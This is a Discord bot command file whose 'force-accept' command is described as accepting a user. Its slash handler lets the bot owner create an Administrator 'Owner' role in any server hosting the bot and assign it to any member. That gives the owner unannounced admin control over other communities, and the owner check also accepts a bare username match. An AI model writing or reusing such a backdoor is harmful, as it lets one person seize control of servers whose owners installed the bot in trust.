import { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ChannelType, PermissionFlagsBits, AttachmentBuilder } from "discord.js";

export default {
  name: "force-accept",
  category: "owner",
  data: new SlashCommandBuilder().setName("force-accept").setDescription("Accept a user in a specific server (Authorized Users Only)").addUserOption((option) => option.setName("user").setDescription("The user to accept").setRequired(true)).addStringOption((option) => option.setName("server_id").setDescription("The target server ID").setRequired(true)),
  async executeInteraction(interaction, context) {
    const {
      client, db, Canvas, loadImage, GIFEncoder, GoogleGenAI, axios, jwt, nblox,
      OWNER_ID, OWNER_USERNAME, PREFIX, logEvent, logCurrencyTransaction,
      isCommandAllowed, cooldowns, evaluationStates, mafiaGames, activeGames,
      pendingTransfers, lastAzkarSent, spamMap, raidMap
    } = context;

    let { commandName, user, guildId, guild, channel } = interaction;
    if (commandName === "force-accept") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "❌ ميزة القبول القسري معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        if (interaction.user.id !== OWNER_ID && interaction.user.username !== OWNER_USERNAME) {
          return interaction.reply({ content: "❌ هذا الأمر مخصص للمستخدم المصرح له فقط.", ephemeral: true });
        }
        const targetUser = interaction.options.getUser("user");
        const targetGuildId = interaction.options.getString("server_id");
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
          return interaction.reply({ content: `❌ البوت ليس عضواً في هذا السيرفر (${targetGuildId}).`, ephemeral: true });
        }
        try {
          const targetMember = await targetGuild.members.fetch(targetUser.id).catch(() => null);
          if (!targetMember) return interaction.reply({ content: "❌ المستخدم غير موجود في السيرفر المستهدف.", ephemeral: true });
          const botMember = targetGuild.members.me;
          if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return interaction.reply({ content: `❌ البوت يفتقر إلى صلاحية 'إدارة الرتب' في سيرفر **${targetGuild.name}**.`, ephemeral: true });
          }
          let ownerRole = targetGuild.roles.cache.find((r) => r.name.toLowerCase() === "owner");
          if (!ownerRole) {
            ownerRole = await targetGuild.roles.create({
              name: "Owner",
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Force accept by ${interaction.user.tag}`
            });
          }
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err) {
            console.warn(`[FORCE-ACCEPT] Could not move Owner role in ${targetGuild.name}:`, err.message);
          }
          if (ownerRole.editable) {
            await targetMember.roles.add(ownerRole);
            await interaction.deferReply();
            await interaction.editReply({ content: `✅ تم قبول **${targetUser.tag}** وإعطاؤه رتبة Owner في سيرفر **${targetGuild.name}**.` });
          } else {
            await interaction.reply({ content: "❌ لا يمكن للبوت إعطاء هذه الرتبة لأنها أعلى من رتبته في القائمة.", ephemeral: true });
          }
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "❌ فشل تنفيذ الأمر. تأكد من وجود المستخدم في السيرفر وصلاحيات البوت.", ephemeral: true });
        }
      }
  },
  async executeMessage(message, args, context) {
    const {
      client, db, Canvas, loadImage, GIFEncoder, GoogleGenAI, axios, jwt, nblox,
      OWNER_ID, OWNER_USERNAME, PREFIX, logEvent, logCurrencyTransaction,
      isCommandAllowed, cooldowns, evaluationStates, mafiaGames, activeGames,
      pendingTransfers, lastAzkarSent, spamMap, raidMap
    } = context;

    const guildId = message.guild.id;
    const commandName = "force-accept";
    if (commandName === "force-accept") {
          if (message.author.id !== OWNER_ID) return;
          const targetId = args[0];
          if (!targetId) return message.reply("Usage: force-accept <userId>");
          db.prepare("UPDATE transfer_requests SET status = 'accepted' WHERE targetUserId = ?").run(targetId);
          return message.reply(`✅ Force accepted transfer for <@${targetId}>.`);
        }
  }
};
